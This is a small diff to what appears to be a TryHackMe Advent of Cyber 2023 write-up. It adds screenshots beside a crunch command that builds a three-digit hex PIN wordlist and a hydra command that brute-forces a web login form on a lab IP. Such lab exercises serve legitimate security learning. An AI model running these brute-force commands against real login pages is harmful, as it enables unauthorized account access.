@@ -8,10 +8,11 @@
 ```s
 crunch 3 3 0123456789ABCDEF -o 3digits.txt
 ```
+![image](https://github.com/PolGs/THM-Advent-of-Cyber-2023/assets/19478700/44c735dc-8ed4-472e-b7d1-af5291b0fb5d)
+
 
 ## Cracking with hydra
 ```s
 hydra -l '' -P 3digits.txt -f -v 10.10.174.107 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
 ```
-
-
+![image](https://github.com/PolGs/THM-Advent-of-Cyber-2023/assets/19478700/72875a73-ea57-4b6f-9363-97fc988a72f8)
